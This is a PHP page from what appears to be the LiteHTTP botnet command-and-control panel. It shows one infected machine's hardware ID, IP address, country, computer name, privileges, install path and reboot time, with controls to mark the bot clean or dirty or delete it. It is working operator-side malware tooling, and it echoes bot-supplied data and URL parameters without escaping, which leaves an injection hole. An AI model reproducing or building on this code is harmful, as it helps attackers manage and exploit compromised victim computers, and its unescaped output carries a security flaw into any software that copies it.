<?php
$u = explode(":", $_SESSION['LiteHTTP']);
$username = $u[0];

include 'inc/stats.php';
include 'inc/geo/geoip.inc';
$gi = geoip_open("inc/geo/GeoIP.dat", "");
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8">
	<title>Control Panel</title>
	<meta content='width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no' name='viewport'>
	<link href="css/bootstrap.min.css" rel="stylesheet" type="text/css" />
	<link href="css/font-awesome.min.css" rel="stylesheet" type="text/css" />
	<link href="css/ionicons.min.css" rel="stylesheet" type="text/css" />
	<link href="css/main.css" rel="stylesheet" type="text/css" />
	<!--[if lt IE 9]>
		<script src="js/html5shiv.js"></script>
		<script src="js/respond.min.js"></script>
	<![endif]-->
</head>
<body class="wysihtml5-supported skin-black fixed">
	<header class="header">
		<a href="?p=main" class="logo">
			LiteHTTP
		</a>
		<nav class="navbar navbar-static-top" role="navigation">
			<div class="navbar-right">
				<ul class="nav navbar-nav">
					<li class="dropdown user user-menu">
						<a href="#" class="dropdown-toggle" data-toggle="dropdown">
							<i class="glyphicon glyphicon-user"></i>
							<span><?php echo $username; ?> <i class="caret"></i></span>
						</a>
						<ul class="dropdown-menu">
							<li class="user-footer">
								<div class="pull-left">
									<a href="?p=account" class="btn btn-default btn-flat">Edit Account</a>
								</div>
								<div class="pull-right">
									<a href="?p=logout" class="btn btn-default btn-flat">Logout</a>
								</div>
							</li>
						</ul>
					</li>
				</ul>
			</div>
		</nav>
	</header>
	<div class="wrapper row-offcanvas row-offcanvas-left">
		<aside class="left-side sidebar-offcanvas">
			<section class="sidebar">
				<ul class="sidebar-menu">
					<li>
						<a href="?p=main">
							<i class="fa fa-dashboard"></i> <span>Dashboard</span>
						</a>
					</li>
					<li class="active">
						<a href="?p=bots">
							<i class="fa fa-list"></i> <span>Bots</span>
							<small class="badge pull-right bg-green"><?php echo $online; ?></small>
						</a>
					</li>
					<li>
						<a href="?p=tasks">
							<i class="fa fa-bar-chart"></i> <span>Tasks</span>
						</a>
					</li>
					<li>
						<a href="?p=settings">
							<i class="fa fa-cog"></i> <span>Settings</span>
						</a>
					</li>
					<li>
						<a href="?p=users">
							<i class="fa fa-users"></i> <span>Users</span>
						</a>
					</li>
					<li>
						<a href="?p=logs">
							<i class="fa fa-list-alt"></i> <span>Panel Logs</span>
						</a>
					</li>
					<li>
						<a href="?p=help">
							<i class="fa fa-question"></i> <span>Help</span>
						</a>
					</li>
				</ul>
			</section>
		</aside>
		<aside class="right-side">
			<section class="content">
				<div class="row">
					<div class="col-lg-12 col-xs-24">
						<?php
						if (isset($_GET['id']))
						{
							if (!ctype_digit($_GET['id']))
							{
								echo '<div class="alert alert-danger">Specified ID is not valid. Redirecting...</div><meta http-equiv="refresh" content="2;url=?p=bots">';
								die();
							}else{
								$cnt = $odb->prepare("SELECT COUNT(*) FROM bots WHERE id = :id");
								$cnt->execute(array(":id" => $_GET['id']));
								if (!($cnt->fetchColumn(0) > 0))
								{
									echo '<div class="alert alert-danger">Specified ID was not found in database. Redirecting...</div><meta http-equiv="refresh" content="2;url=?p=bots">';
									die();
								}
							}
							if (isset($_GET['del']) && $_GET['del'] == "1")
							{
								$del = $odb->prepare("DELETE FROM bots WHERE id = :id LIMIT 1");
								$del->execute(array(":id" => $_GET['id']));
								$in = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, :r, UNIX_TIMESTAMP())");
								$in->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR'], ":r" => 'Deleted bot #'.$_GET['id']));
								echo '<div class="alert alert-success">Bot deleted successfully. Redirecting...</div><meta http-equiv="refresh" content="2;url=?p=bots">';
								die();
							}
							if (isset($_GET['mark']))
							{
								$m = $_GET['mark'];
								if ($m == "1")
								{
									$mark = $odb->prepare("UPDATE bots SET mark = :mark WHERE id = :id LIMIT 1");
									$mark->execute(array(":mark" => "1", ":id" => $_GET['id']));
									echo '<div class="alert alert-success">Bot marked successfully.</div>';
								}elseif ($m == "2"){
									$mark = $odb->prepare("UPDATE bots SET mark = :mark WHERE id = :id LIMIT 1");
									$mark->execute(array(":mark" => "2", ":id" => $_GET['id']));
									echo '<div class="alert alert-success">Bot marked successfully.</div>';
								}
							}
						}
						?>
					</div>
					<div class="col-lg-3 col-xs-6"></div>
					<div class="col-lg-6 col-xs-12">
						<center><a href="?p=bots"><i class="fa fa-arrow-left"></i> Go back</a></center><br>
						<table class="table table-condensed table-hover table-striped table-bordered">
							<thead>
								<tr>
									<th width="50%">Key</th>
									<th width="50%">Value</th>
								</tr>
							</thead>
							<?php
							$details = $odb->prepare("SELECT * FROM bots WHERE id = :id");
							$details->execute(array(":id" => $_GET['id']));
							$d = $details->fetch(PDO::FETCH_ASSOC);
							?>
							<tbody>
								<tr><td>ID</td><td><?php echo $d['id']; ?></td></tr>
								<tr><td>HWID</td><td><?php echo $d['bothwid']; ?></td></tr>
								<tr><td>IP Address</td><td><?php echo $d['ipaddress']; ?></td></tr>
								<tr><td>Country</td><td><?php echo geoip_country_name_by_id($gi, $d['country']); echo '&nbsp;&nbsp;<img src="img/flags/'.strtolower(geoip_country_code_by_id($gi, $d['country'])).'.png" />'; ?></td></tr>
								<tr><td>Install Date</td><td><?php echo date("m-d-Y, h:i A", $d['installdate']); ?></td></tr>
								<tr><td>Last Response</td><td><?php echo date("m-d-Y, h:i A", $d['lastresponse']); ?></td></tr>
								<tr><td>Current Task</td><td>#<?php echo $d['currenttask']; ?></td></tr>
								<tr><td>Computer Name</td><td><?php echo base64_decode($d['computername']); ?></td></tr>
								<tr><td>Operating System</td><td><?php echo $d['operatingsys']; ?></td></tr>
								<tr><td>Privileges</td><td><?php echo $d['privileges']; ?></td></tr>
								<tr><td>Installation Path</td><td><?php echo base64_decode($d['installationpath']); ?></td></tr>
								<tr><td>Last Reboot</td><td><?php echo base64_decode($d['lastreboot']); ?></td></tr>
								<tr><td>Bot Version</td><td><?php echo $d['botversion']; ?></td></tr>
							</tbody>
						</table>
						<center>
						<?php
						if ($d['mark'] == "1")
						{
							echo '<h4>This bot is marked as <font style="color: green;">Clean</font></h4><br><a class="btn btn-danger" href="?p=details&id='.$_GET['id'].'&mark=2">Mark bot as dirty</a>';
						}else{
							echo '<h4>This bot is marked as <font style="color: red;">Dirty</font></h4><br><a class="btn btn-success" href="?p=details&id='.$_GET['id'].'&mark=1">Mark bot as clean</a>';
						}
						?>
						<a href="?p=details&id=<?php echo $_GET['id']; ?>&del=1" class="btn btn-danger">Delete Bot</a>
						</center>
					</div>
				</div>
			</section>
		</aside>
	</div>
	<script src="js/jquery.min.js" type="text/javascript"></script>
	<script src="js/bootstrap.min.js" type="text/javascript"></script>
	<script src="js/jquery-ui.min.js" type="text/javascript"></script>
</body>
</html>